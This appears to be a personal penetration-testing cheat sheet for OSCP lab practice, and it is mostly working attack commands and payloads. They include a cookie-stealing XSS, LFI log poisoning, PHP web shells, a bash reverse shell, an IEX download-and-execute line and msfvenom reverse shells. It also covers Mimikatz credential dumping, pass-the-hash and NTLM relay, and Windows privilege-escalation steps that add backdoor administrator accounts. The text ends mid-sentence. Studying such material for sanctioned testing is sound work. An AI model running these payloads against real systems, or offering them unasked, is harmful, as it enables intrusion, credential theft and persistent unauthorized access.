https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
HTB writeups machines --> https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/
powershell scripts --> https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
- the appropriate msfvenom payload for each webserver. you need to check the framework from wappalyzer
-     https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
------------------------------------------------------------------cross site scripting-----------------------------------------------------------------------
- XSS SCRIPTS
-      <ScRipT>alert("XSS");</ScRipT>
-     <scr<script>ipt>alert(1)</script>
-     <svg/onload=alert(1)>
-     <a href=javascript:confirm()>click here
-     <img src=`xx:xx`onerror=alert(1)>
-     <img src=//x55.is OnError=import(src)>
-     </script><script >alert(document.cookie)</script>
-     <script>new  Image().src="http://10.0.2.10:4444/bogus.php?output="+escape(document.cookie);</script>

To automate the process, use the following tools
-	xsstrike
-	xsshunter
-	BeEF
-	JShell

-----------------------------------------------------------------Local File Inclusion-------------------------------------------------------------------------
- Null Byte will ignore the extension
-     ../../../../../../etc/passwd%00.jpg
- php filter
-     php://filter/convert.base64-encode/resource=
-      data://text/plain,<?php echo system('ls');?>
- poising a log file
- /roc/self/environ || /var/log/auth.log [ssh log file] || /var/log/apache2/access.log [web server log file]
- poison the auth.log file
-     Ssh “<?php passthru(base64_decode(‘base64PAYLOAD==’))?>”@10.0.2.13
- execute a php file from an external server
-     ./ngrok http 9000  && python -m SimpleHTTPServer
- execute a command
-     <?php system('ls') ?>
- add cmd as a parameter
-     <?php system($_GET['cmd']); ?>
-     example.com/index.php?view=cat../../../../../../../../../var/log/apache2/access.log&cmd=ls
- add cmd in data wrapper
-      echo -n '<?php echo system($_GET["cmd"]);?>' | base64
-        curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
- bash reverse shell
-     bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
- fuzz LFI
-     ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> searching for LFI
- decode (base64) the PHPSESSID, you may find a path for /var/www/html/index.php --> you can change the path inside the cookie, encode it again then send it 
- Linux --> /etc/passwd
     - example.com/index.php?id=1
- windows --> IIS 
     - example.com/index.aspx?id=1
- xampp may run .apache .php .mysql --> so you can't guarantee that the running machine is Windows
- RFI using simple-backdoor.php
-     curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&cmd=ls"

-----------------------------------------------------------------File Upload-------------------------------------------------------------------------
- if the PHP files are blacklisted you can try the following file extensions [phps, php7, phtml]
- also check to play with lower/upper caps example .pHP
- if you used simple-backdoor.php. you need to use cmd for the execution
-     curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
- obtaining a reverse shell on Windows (book page number 271)
-     curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
- if you can't execute the uploaded file. you can try to overwrite the authorized key file in the home directory and connect to SSH with the private key (book page number 275)
-     ssh-keygen 
-     cat <file.pub> authorized_keys
- upload the file in the following path
-     ../../../../../../../root/.ssh/authorized_keys
- before connecting to the SSH delete know_hosts file
-     rm ~/.ssh/know_hosts
-     ssh -p <port> -i <file> root@10.0.2.10

-----------------------------------------------------------------SQL INJECTION-------------------------------------------------------------------------
- Cheat Sheet
-     https://portswigger.net/web-security/sql-injection/cheat-sheet
- where you can find SQL injection:
- GET REQUEST
-     http://site.com/index.php?id=1
- POST REQEUST
-     login page
- Header parameter like Referrer, host, user agent
- Cookie: id=123123;
- to detect SQL injection use the following chars (' " \)
- to comment the remain statement in get reqeust use
-     --+
- to comment the remain statement in post reqeust use
-     '--SPACE 
-     '-- - 
-     ' #
- find table name from information_schema.tables
-     /filter?category=Food+%26+Drink'union+select+table_schema,table_name+from+information_schema.tables--+
-     https://www.sqlinjection.net/table-names/
- find the column name from the table
-     /filter?category=Pets'union+select+null,column_name+from+information_schema.columns+where+table_name='users_kuqbsq'--%20
-     https://www.sqlinjection.net/column-names/
- Blined BOOLEAN SQL INJECTION
-     SELECT "You are in ..." where id='2' and 'a'='a';
- Time-Based SQL INJECTION
-     ?id=2' and sleep(5) --+
- queries you may use
-     SELECT username,password from accounts where name='admin' limit 0,1;
-     username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
-     username=' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables
- find the total number of vuln columns
-     ?id=2' order by n --+
-     ?id=2' union select null,null,'text',null,n-1 --+
-     ?id=2' union select 1,version(),database(),user() --+
- Blind SQLI with conditional response - you can't use UNION in blind sqli
-     ?id=2' and 1 = 0 --+
- to check whether <TableName> exits or not in Blind SQLI
-     ' and (select 'x' from <TableName> LIMIT 1)='x' --+
- confirm <UserName> exits in the <TableName>
-     ' and (select <ColumnName> from <TableName> where <ColumnName>='<UserName>')='<UserName>' --+
-     ' and (select 'x' from users where username='administrator' LIMIT+1)='x'+--+
- check the length of the password in blind sqli // can be done manually as well as using intruder
-     ' and (select username from users where username='administrator' and LENGTH (password)>=20)='administrator' --+
- user substring function to brute force  send it to the intruder and choose (sniper with payload type brute forcer) or (cluster bomb)
-     ' and (select substring(password,1,1) from users where username='administrator')='a' --+
- return data in blind SQL injection
-     select substring('RAMAN',1,1)='R'; --> True
- Evasion Techniques
-     https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
-     '/*12345order*/by 7 #
-     URL encode, hex etc...
-     EXEC('SELE'+'CT')
-     "UNION    SELECT"
-     '/**/or/**/1/**/=/**/1/**/
- try to use hack bar plugin https://github.com/PhHitachi/HackBar with Firefox version 42 this facilitate SQL injeciton
- SQLMAP Get Request:
-     sqlmap -u "<ULR>" -p <Injection parameter> [Options]
-     sqlmap -u "<URL>" -p <Injection Parameter> --dbms=<DB_Type>
-     sqlmap -u "<ULR>" --users <other options>
-     sqlmap -u "<ULR>" -p <Injection parameter> --dbs <other options>
-     sqlmap -u "<ULR>" -p <Injection parameter> -D <database> --tables <other options>
-     sqlmap -u "<ULR>" -p <Injection parameter> -D <database> -T <TableName> --columns <othe options>
-     sqlmap -u "<URL>" -p <Injection Parameter> -D <database> -T <TableName> -C <ColumnName1,ColumnName2> --dump <other options>
- SQLMAP Post Request:
-     sqlmap -u "<URL>" --data=<POST string from burp> -p <Injection parameter> [Options]
-     sqlmap -u "<URL>" --data=<POST string from burp> -p <Injection parameter> --dump [Options]
- SQLMAP using request file:
-     sqlmap -r <request file from burp.txt> -p <Injection Parameter> [Options]

-----------------------------------------------------------------Password Attack-------------------------------------------------------------------------
use the following website for the rainbow table attack
-     https://md5hashing.net/
- hydra
-     hydra -l <username> -P /rockyou.txt <IP> http-post-form "<PATH>:<REQUEST_FROM_BURP>:<ERROR MESSAGE>"
- cewl is a tool for generating a custom password list. just give it a link
-     cewl <https://link> -m 8 > pass.txt
- hashid is a tool for checking the type of the hash
-     hashid '<hash>'
- pass the hash attack in cmd
-     sekurlsa::pth /user:Administrator /domain:localhost /ntlm:32asdjfklajsdfjaslkfjalsjflks
- rule based attack
- rule file can be as the following
-     $1 c $! --> $1 add 1 at the end of the password file. c to make the first letter capital. $! add ! at the end of the password file ex. Password1!
-     hashcat -m <hashtype> <hash file> <rockyou.txt> -r <rule file> --force
- password manager (keypass) has the extension of .kdbx
- search all files that have extension of .kdbx using PowerShell
-     Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
- share/copy the keepass file to kali machine
-     copy .\Documents\Database.kdbx \\<IP>\share\Database.kdbx
- crake the pass using keepass2john 
-     keepass2john <keepass file> > keepass.hash
- know the mode number of the hashcat
-     hashcat -h | grep -i "keepass"
- don't forget to delete the file name at the beginning of the file then use hashcat to crack the hash
-     hashcat -m 13400  <keepass.hash> <password list> -r <rule file> --force
- cracking ssh private key passphrase by john
- - transfer the ssh private key to hash
-     ssh2john id_rsa > ssh.hash
- then you need to set a rule in the beginning of the pass file. rule of the ssh is [List.Rules:sshRules] then append this rule to the JTR configuration file using the following command
-     sudo sh -c 'cat /home/kali/ssh.rule >> /etc/john/john.conf'
-     john --wordlist=<wordlist> --rules=sshRules ssh.hash
- cracking NTLM hashes
- first you need to retrieve the password from sam database
-     pritvilege::debug
-     token::elevate
-     sekurlsa::logonpasswords 'OR use' lsadump::sam
- NTLM mode in hashcat
-     hashcat -h | grep -i "ntlm"
- use hashcat to crack the password
-     hashcat -m 1000 <ntlmhash.hash> rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
- passing NTLM to connect to smb shares
-     \\\\<IP>\\<ShareName> -U Administrator --pw-nt-hash <NTLM_hash>
-  impacket-psexec: will always give you a system shell. impacket-wmiexec: will give you a user shell
- passing NTLM to obtain a shell. if you don't have NL hash you can fill it wil 32 zeros
-     impacket-psexec -hashes NL:NTLM Administrator@<IP>
-     impacket-psexec -hashes 00000000000000000000000000000000:NTLM Administrator@<IP>
-     impacket-wmiexec -hashes NL:NTLM Administrator@<IP>
- if you get access to an unprivileged machine you may can't use mimikatz to dump the NTLM hash. in this case you need to crake Net-NTLMv2 by setting smb server and use responder to capture Net-NTLM hash
- first use ip a command to check the IP and interface of the machine
-     ip a
- secondly, run responder
-     sudo responder -I <interface> -v
- from the target machine list any smb share to get the authentication from the responder
-     dir \\<Kali_IP>\test 'Note: this will give access denied. go and check the output of responder'
- save the output to file.hash and check the correct mode
-     hashcat -m 5600 <file.hash> rockyou.txt --force
- Relaying the hash (pass the Net-NTLM hash). used if you can't crack the NTLM hash
- first, send a reverse shell typed by powershell and encoded by base64
-     sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <payload>"
- secondly, use nc to listed on port 8080
- thirdly, using cmd that is connected to the target machine, send smb authentication
-     dir \\<Kali_IP>\test
- fourthly, you will receive a connection on the nc listener
 
-----------------------------------------------------------------Searching for Exploits-------------------------------------------------------------------------
- https://www.exploit-db.com/
- searchsploit
- nmap scripting engine
- metasploit
- compiling exploits on windows
-     i686-w64-mingw32-gcc <42341.c> -o <exploit.exe> -lws2_32
- assuming that the website has an SSL certificate on the browser. you need to fix the exploit by adding 'verify=False' in the post request.
-     response = requests.post(url, data=data, allow_redirects=False, verify=False)

--------------------------------------------------------------------Tunneling & Port Redirection----------------------------------------------------------------------
- SSH Local Port Forwarding (from the attacher machine you connect to the machin2) (In this scenario only one machine can access the service)
-     ssh -l 127.0.0.1:<SerivePort>:<Machine2>:<SerivePort> raman@<Machine1>
-     curl 127.0.0.1:80
- SSH Remote Port Forwarding (make a reverse connection from Machine2 to the attacker machine) (no machine can access the service unless the local machine)
-     ssh -R <PortThatUWillBeListeningFrom ex.8080>:127.0.0.1:<ServicePort> raman@<YourIP>
- SSH Dynamic Port Forwarding
-     ssh -D <PortThatUWillBeListeningFrom ex.8080> raman@<Machine that can access the website>
-     then go to firefox --> proxy --> choose manual proxy --> set SOCKS Host to 127.0.0.1 & Port 8080

-----------------------------------------------------------------Windows Privilege Escalation TCM---------------------------------------------------------------------
- https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources
- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
F (full access) |  M (modify access) | RX (read & execute access) | R (read-only access) | W (write-only access)

Windows Enumeration:
- system enum
-     systeminfo
-     check the patches (HotFixes) --> wmic qfe
-     list the drives ex. C: D: --> wimc logicaldisk
-     list the drives ex. C: D: --> wmic logicaldisk get caption,description,providername
-     gather information about a file --> get-content file.lnk
- user enum and groups
-     user that you are logged in with --> whoami
-     check user privilege --> whoami /priv
-     check the group that you are belonging to --> whoami /groups
-     show all users on the machine --> net user
-     gather info about X user --> net user <username>
-     check all users in X group --> localgroup <groupname>
- network enum
-     ipconfig /all
-     check all IPs that are connected to the machine --> arp -a
-     check what other machines are communicating to the machine (Possible to Pivoting) --> route print
-     check open ports on the machine (Possible to port forwarding) --> netstat -ano
- password hunting (passwords are in files). make sure in which directory you are then run the command. you also can run the command in the root directory
-     findstr /si password *.txt *.ini *.config
- firewall & Antivirus
-     find info about particular services like windefend --> sc query windefend
-     list all running services on the machine --> sc queryex type= service
-     check firewall settings --> netsh firewall show state OR netsh advfirewall firewall dump
- Automated Tools:
     Executables:
         - winPEAS.exe //recommended
         - Seatbelt.exe (compile)
         - Watson.exe (compile)
         - SharpUp.exe (compile)
     Powershell:
         - Sherlock.ps1 //recommend a kernel exploitation
         - PowerUp.ps1 //recommended
         - jaws-enum.ps1
     Others:
         - Windows-exploit-suggester-python3 (local) //recommended
         - Exploit Suggester (Metasploit)
- sherlock usage:
add Find-AllVulns in the last line
-     echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2/Sherlock.ps1') | powershell -noprofile - #download & execute any powershell script

- Windows-exploit-suggester usage:
  1- run 'systeminfo' and save it into a <sysinfo.txt>
  2- download and extract the tool from Git Hub.
  3- install pip if you don't have it --> curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py && pip install xlrd --upgarde
  4- Update the database --> ./windows-exploit-suggester.py --update
  5- ./windows-exploit-suggester.py --database <updatedDB.xls> --systeminfo <sysinfo.txt>
  
- Stored Passwords
- check the registry. you may find a default password
-     reg query HKLM /f password /t REG_SZ /s
- if you find any default password run the following
-     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
- if SSH is running on the system use the found credentials to login

**keep in mind to check the permissions in windows like icacls, icacls root.txt /grant <username>:F (this will grant full access to a file)**

1- Escalation Path - Kernel Exploitation
here is all kernel exploitation from GitHub: https://github.com/SecWiki/windows-kernel-exploits
- run systeminfo command on the target system then user windows-exploit-suggester-python3 to find exploits.

2- Port Forwarding
- check the open ports in the machine
-     netstat -ano
- after netstat -ano command you find a public port you can use plink.exe to connect to that port
- download and transfer plink.exe file to the windows machine using cetutil tool
- install ssh and edit the config file (kali)
-     apt install ssh && nano /etc/ssh/sshd_config
- change #PermitRootLogin line in the sshd_config file to the following
-     PermitRootLogin yes
-     service ssh restart && service ssh enable
- from the Windows machine
-     plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
- assume windows has a local SMB service running on 445 and your Kali machine is 10.10.16.9. if you have credentials you can use a tool like psexec to login but if you don't have, use the following tunneling
-     plink.exe -l raman -pw to0or -R 445:127.0.0.1:445 10.10.16.9
- keep on hitting enter and you will get a root shell (this is the windows machine not kali machine)
- now you need to use winexe tool to execute a command in Windows
-     winexe -U Administrator%<Password that you found in the registry> //127.0.0.1 "cmd.exe"
- run the command multiple times if it doesn't work

3- Windows Subsystem for Linux
- fist check if bash.exe and wsl.exe are installed
-     where /R c:\windows bash.exe
- run either bash.exe or wsl.exe to get a shell then use python tty escape to get a shell
-     C:\>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
-     python -c 'import pty; pty.spawn("/bin/bash")'
- check the history or sudo -l and continue linux enum

4- Impersonation 
if you get a cmd shell and you can't upload any file on the system use msfconsole for the privilege escaliton
use /exploit/multi/script/web_delivery
set SRVHOST | PAYLOAD | LHOST | LPORT | TARGET then run
copy and paste the payload into the cmd shell. you should have a new session
after getting the meterpreter session run post/multi/recon/local_exploit_suggester
use any of the suggested exploits and run it
in the meterpreter shell type
-     load incognito
-     list_tokens -u
-     impersonate_token "NT AUTHORITY\SYSTEM"
sometimes you need to migrate to another process to get the NT AUTHORITY\SYSTEM
use godpotato
check Jeeves box FYR
4.1- use juicy potato by transferring the file to the target machine (AV is off). JuicyPotato doesn't work on windows server 2019 and windows 10 build 1809. use PrintSpoofer insted.
download exe file -> https://github.com/ohpe/juicy-potato/releases/tag/v0.1
-     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID of your windows machine} #you can get it from https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
4.2- use juicy potato by setting up your SMB server (AV is on)
put juicypotato.exe & reverse.exe from msfvenom in your SMB server
-     impacket-smbserver raman `pwd` #set up SMB server
-     cmd /c "\\10.10.16.3\raman\juicypotato.exe -l 1337 -p \\10.10.16.3\raman\reverse.exe -t * -c {CLSID of your windows machine}"
4.3- PrintSpoofer
curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
.\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe

if you run PowerUp and got a clear password use impacket to login with the open service. If SQL, use mssqlclient.py; if SMB, use psexec.py; if WinRM or evil-winrm

Alternate Data Stream (hidden files)
ls -la is equal to dir /R in windows
-     more < raman.txt:hidden.txt

if the AV is enabled you can execute commands from the SMB server
setup a smbserver
-     impacket-smbserver raman `pwd`
generate msfvenom payload and execute the command
-     http://login.php?cmd=cmd /c "10.10.16.6\raman\reverse.exe" #don't forget the URL encoding

Copy a file from Windows to Linux by setting up SMB server
setup a smbserver
-     impacket-smbserver raman `pwd`
cd to the share
-     cd \\10.10.16.13\raman
-     cp c:\users\raman\raman.kdbx .

setup an FTP server
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
-     ftp 10.10.16.4
-     username:anonymous
-     put windows_service.c

5- Get System

6- RunAs
run the following command to check next two lines information 
-     cmdkey /list
if you find Target: Domain:interactive=Access\Administrator Type: Domain Password User: Access\Administrator
use RunAs command to get the flag
-     C:\Windows\System32\runas.exe /user:Access\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\raman\root.txt"

7- Always Install Elevated
run powerup and check if the AlwaysInstallElevated is there or not. if yes you can run the command that is in the powerup to add a new user to the administrator group (it will generate a program to add the user)
you also can check AlwaysInstallElevated from the cmd. if the AlwaysInstallElevated has a value of 0x1 means it's on
-     reg query HKLM\Software\Policies\Microsoft\Windows\Installer
-     reg query HKCU\Software\Policies\Microsoft\Windows\Installer
then run the program that powerup generated to create a backdoor user and set the user to the administrator group
another option is to use meterpreter to elevate your session
-     exploit/windows/local/always_install_elevated

8- abusing service registry
to check if you have access to the registry service 
-     PowerShell -ep bypass
-     Get-Acl -Path hkln:\System\CurrentControlSet\service\regsvc | fl
if you have FullControl in the Access for your user (might be NT AUTHORITY\INTERACTIVE ALLOW). you can let the service run a reverse shell or add a user to the administrator group
now you need to download a file from Windows to Kali. Use an FTP server to do that
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). DON'T FORGET TO COMPILE THE C FILE
-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
move the compiled c file to windows then run it using
-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
-     sc start regsvc
net localgroup administrator

9- Executable Files (you need to use windows_service.c from Point #8 (above))
run powerup and check service executables
you also can check executable services from the cmd command
-     C:\Users\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"     (executable service)
now you need to download a file from windows to kali. use ftp server to do that
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
head to C:\Tools\Source and connect to kali ftp server, anonymous login, then put the windows_service.c file
-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). DON'T FORGET TO COMPILE THE C FILE
-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
move the compiled c file to Windows (replace it with c:\ProgramFiles\FilePermissionsService) then run it using
-     sc start FilePermService
net localgroup administrator

10- Startup Applications
check if you have written access to the startup application. if yes use msfvenom to get a meterpreter session
-     icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (BUILTIN\Users:(F)) //F means you have full access
save the below payload in the c:\ProgramData\Microsoft\StartMenu\Programs\Startup and start-up multihandler
-     msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe -o raman.exe
then you need to wait for the administrator to login then you will get a shell

11- DLL Hijacking
look for a writeable path and the DLL doesn't exist (DLL name not found). cause when you run an executable program in Windows the program will look for a DLL. if the DLL doesn't exists you can get malicious
you will use the following script https://github.com/sagishahar/scripts/blob/master/windows_dll.c
-     system("cmd.exe /k net localgroup administrators user /add"); #replace the following with the system command to add a user
compile the c file. transfer it to Windows. download the dll file. move to the writeable path and run the following command
-     sc stop dllsvc && sc start dllsvc #stop dll service and restart it again

12- Binary Path
run PowerUp.ps1
Get more information about the service
-     sc qc UsoSvc   #check BINARY_PATH_NAME
overwrite the binpath of the service
-     sc config <Service> binpath="C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.14 9004 -e cmd.exe"
check the binary path again
-     sc stop <Service>     #stop the service
-     sc start <Service>    #start it again

13- Unquoted Service Path
this means the service path doesn't have quotes  so what will happen is the windows will run the following path as Program.exe -> Program Files.exe -> Unqouted.exe -> Unqouted Path.exe -> Unqouted Path Service.exe.
run PowerUp.ps1/winPEAS.exe to check the unquoted path
C:\Program Files\Unquoted Path Service\Common Files\...
-     sc query ServiceName #make sure that service is running
-     sc stop ServiceName #stop the service
create a common.exe file using msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe -o common.exe
move the file to the common path and upload the file then start the service again 
-     sc start ServiceName

Extract the hash from windows. you need to have sam, security, and system files
-     secretsdump.py -sam SAM -security SECURITY -system SYSTEM local

-----------------------------------------------------------------Active Directory---------------------------------------------------------------------
Active Directory:
.          NTDS.dit is a file that has all of the passwords. stored in %SystemRoot%\NTDS




-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
Platforms
1. for Initial Access work on eJPT, This article and official content 
Windows Privilege Escalation use TCM security, official content, YouTube videos
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners
Linux Privilege Escalation TCM Linux,  official content, YouTube videos
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://academy.tcm-sec.com/p/linux-privilege-escalation
Windows & Linux privilege escalation mind map


LABS Platforms
One of the best choices for a lab is Tjnull, which includes machines from Hack The Box, TryHackMe, Proving Grounds (practice), and the official OffSec labs for play
https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#

1. Initial Access with Different Ports
General:
If you find credentials, use ports 21, 22, 3389, web login pages (HTTP listening ports), port 161 (evil-winram), and databases.
Try a high-access approach first, targeting systems with elevated rights such as RDP and SSH.
Always check the /.ssh/ directory for RSA and authorized keys.
Nmap
-     autorecon <ip>  (best tool with UDP and TCP scan, you don’t want to use -sU -sT)
-     nmap -v --max-retries=0 -T5 -p- 10.10.10.97 (check all open ports)
-     nmap -A -Pn <ip> (Best Nmap command for initial access)
-     nmap -sC -sV -A -T4 -Pn -o 101.nmap 192.168.10.10  ( * always check version for each port vsftp 3.02 exploitable search google or searchsploits)
-     ·Test-NetConnection -Port 445 192.168.10.10 (check 445 is on) 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $)) "TCP port $ is open"} 2>$null    (check port 1 to 1024)   (for window)
-     For each port nmap -sC -A -p21 <ip>   (for specific Port)

Port 21 FTP:
There is username and password on this you can upload shell on direcotyr or find downloads files for initial access.
-     nmap --script=ftp-* -p 21 $ip  (scan complete FTP Port)
check if anonymous allowed then use ftp anonymous@ip  (password also anonymous)
there is some mod if ls dir not work then apply use passive (to go in active mod).
-     ·mget * (# Download everything from current directory like zip, pdf, doc)
-     wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 (# Download everything from ftp server)
send/put (# Send single file or upload shell command)
after download files always use exiftool –u -a <filename> (Meta description for users)
good practise if you can switch to binary (ASCII is default)
·FTP version above 3.0 not exploitable

Port 22 SSH:
you can’t get initial access directly however we can login with user and password and private key.
-     ssh raman@ip
-     ssh -p 2222 raman@192.168.10.10 ( ssh use with different port )
-     curl http://<ip>/index.php?page=../../../../../../../../../home/raman/.ssh/id_rsa
-     chmod 600 id_rsa  and then ssh -i id_rsa -p 2222 raman@ip
-     user/.ssh/authorized key

PORT 25 (relying server to server) 465 (mail client to server)
You can send phishing email with this port to get reverse shell.
Used to send, receive, and relay outgoing emails and Main attacks are user enumeration and using an open relay to send spam
-     nmap 192.168.10.10 --script=smtp* -p 25
always login with telnet <ip> 25

Port 53 DNS:
General enumeration for domain to find hostname and subdodmain etc
-     Nslookup <ip>   | Dig <ip> | Host <ip> | host -t ns $ip  | subdomains, host , ip | dnsenum

Port 80 , 8080, 443:
When executing Nmap, you may discover HTTP ports like 80, 81, 8080, 8000, 443, etc. There's a possibility of finding four HTTP ports on one machine.
In the very first step, run Nmap with an aggressive scan on all ports:
-     nmap -sC -sV -A -T4 -Pn -p80,81,8000,8080,443 192.168.146.101
Simply copy the version name of the website and search on Google to find an exploit.
Furthermore, Nmap reveals some files such as robots.txt, index.html, index.php, login.php, phpinfo, cgi-sys, cgi-mod, and cgi-bin.
If you encounter a host error, find a hostname with port 53 or discover a name in the website source code, footer, contact us, etc.
Then add that discovered domain in the /etc/hosts file to access the site.

Username Enum from error message:
-     wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=raman" --hs "username not found error message" http://10.10.16.3/login.php

Content Discovery:
-     gobuster dir -u http://192.168.10.10 -w  /wd/directory-list-2.3-big.txt (simple run)
-     gobuster dir -u http://192.168.10.10:8000 -w  /wd/directory-list-2.3-big.txt (with different port)
-     gobuster dir -u http://192.168.10.10/raman -w  /wd/directory-list-2.3-big.txt (if you find raman then enumerate raman directory)
With the help of content discovery, you will find hidden directories, CMS web logins, files, etc. This is a crucial step in OSCP.
Utilizing content discovery and Nmap, you can identify CMS, static pages, dynamic websites, and important files like databases, .txt, .pdf, etc. Additionally, you can enumerate websites with automated tools such as WPScan, JoomScan, Burp Suite, and uncover web vulnerabilities like RCE, SQLi, upload functionality, XSS, etc.
If you find any CMS like WordPress, Joomla, etc., simply search on Google for default credentials or exploits of theme, plugin, version etc. In the case of a login page, you can exploit SQL injection and launch a brute-force attack with Hydra. If you identify any CMS, scan it with tools, perform enumeration with brute force, check default usernames and passwords, explore themes, plugins, version exploits, and search on Google. Alternatively, you can discover web vulnerabilities to gain initial access.

wpscan
-     wpscan --url http://10.10.10.10 --enumerate u
-     wpscan --url example.com -e vp --plugins-detection mixed --api-token API_TOKEN
-     wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt
-     wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt

Drupal
-     droopescan scan drupal -u http://example.org/ -t 32
find version > /CHANGELOG.txt

Adobe Cold Fusion
check version /CFIDE/adminapi/base.cfc?wsdl
fckeditor Version 8  LFI
-     http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
-     sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.10.12 LPORT=4545 -f raw > raman.jsp
save the payload in the following directory
-     C:\ColdFusion8\wwwroot\CFIDE\raman.jsp
Elastix
Google the vulnerabilities
default login are admin:admin at /vtigercrm/
able to upload shell in profile-photo

Joomla
Admin page - /administrator
Configuration files configuration.php | diagnostics.php | joomla.inc.php |  config.inc.php

Mambo
Config files >> configuration.php | config.inc.php

Login page
Try common credentials such as admin/admin, admin/password and falafel/falafel.
Determine if you can enumerate usernames based on a verbose error message.
Manually test for SQL injection. If it requires a more complex SQL injection, run SQLMap on it.
If all fails, run hydra to brute force credentials.
View source code
Use default password
Brute force directory first (s’’ometime you don't need to login to pwn the machine)
Search credential by bruteforce directory
bruteforce credential
Search credential in other service port
Enumeration for the credential
Register first
SQL injection
XSS can be used to get the admin cookie
Bruteforce session cookie

Web Vulnerability:
SQLi:
Pentestmonkey cheatsheet
-     Try admin'# (valid username, see netsparker sqli cheatsheet)
-     Try abcd' or 1=1;--
-     Try ' 1 or 1=1;--
-     Try 'OR 1 OR'
-     Use UNION SELECT null,null,.. instead of 1,2,.. to avoid type conversion errors

For mssql,
xp_cmdshell
Use concat for listing 2 or more column data in one

For mysql,
try a' or 1='1 -- -
A' union select "" into outfile "C:\xampp\htdocs\run.php" -- -'

File Upload:
Change mime type
Add image headers
Add payload in exiftool comment and name file as file.php.png
-     <?php system($_GET['cmd']); ?> //shell.php
-     exiftool "-comment<=shell.php" malicious.png
-     strings malicious.png | grep system

use automated tool
-     nikto -h $ip
-     nikto -h $ip -p 80,8080,1234 

Git
Download .git
mkdir <DESTINATION_FOLDER>
./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
Extract .git content
mkdir <EXTRACT_FOLDER>
./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>

LFI and RFI 
IF LFI FOUND then start with
-     ../../../../etc/passwd
SSH keys are
